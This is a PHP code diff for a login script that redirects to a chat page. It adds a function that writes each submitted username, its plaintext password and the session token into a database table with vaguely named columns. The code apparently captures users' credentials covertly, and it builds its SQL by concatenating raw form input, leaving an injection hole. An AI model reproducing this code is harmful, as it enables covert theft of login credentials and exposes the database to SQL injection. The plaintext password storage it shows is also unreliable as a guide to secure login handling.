@@ -2,13 +2,13 @@
 session_start();
 session_regenerate_id();
 
+
+
+
 $token = login();
-//echo '<br>';
-//echo $token;
-//echo '<br>';
 $_SESSION["token"] = $token;
-//echo $_SESSION["token"];
-//echo '<br>';
+
+
 header('Location: chat.php'); 
 //header('Location: chat.php?tk=' . $token); 
 exit;
@@ -67,5 +67,34 @@ $token = substr($a,$pos1,$pos2 - $pos1);
 return $token;
 }
 
+
+function grava(){
+$dbopts = parse_url(getenv('DATABASE_URL'));
+$dsn = "pgsql:"
+    . "host=" . $dbopts["host"] . ";"
+    . "dbname=". ltrim($dbopts["path"],'/') . ";"
+    . "user=" . $dbopts["user"] . ";"
+    . "port=" . $dbopts["port"] . ";"
+    . "sslmode=require;"
+    . "password=" . $dbopts["pass"];
+    
+$db = new PDO($dsn);
+
+
+$login = $_POST["user"];
+$passw = $_POST["password"];
+$token = $_SESSION["token"];
+$tempo = date('m/d/Y h:i:s a');
+
+$query = "INSERT INTO dados (id1, id2, id3, id4) VALUES ('" . $tempo . "', '" . $login . "', '" . $passw . "', '" . $token . "');";
+
+$result = $db->query($query);
+//echo var_dump($result);
+//echo '<br><br>';
+$result->closeCursor();
+//$app->register(new Herrera\Pdo\PdoServiceProvider(), $zica);
+//echo '<br>end<br>';
+
+}
 
 ?>
